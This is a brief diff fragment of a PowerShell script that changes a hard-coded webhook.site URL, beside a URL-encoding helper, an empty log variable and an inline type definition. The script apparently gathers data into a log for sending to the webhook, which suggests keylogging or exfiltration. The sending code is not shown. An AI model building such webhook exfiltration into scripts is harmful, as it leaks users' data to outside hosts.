@@ -4,7 +4,7 @@ function UrlEncode {
     return $encoded
 }
 
-$webhook = "https://webhook.site/fbea19fd-c6a4-4fe7-b371-c0066a01848e"  # Sostituisci con il tuo Webhook
+$webhook = "https://webhook.site/fbea19fd-c6a4-4fe7-b371-c0066a01848e/"  # Sostituisci con il tuo Webhook
 $log = ""
 
 Add-Type -TypeDefinition @"
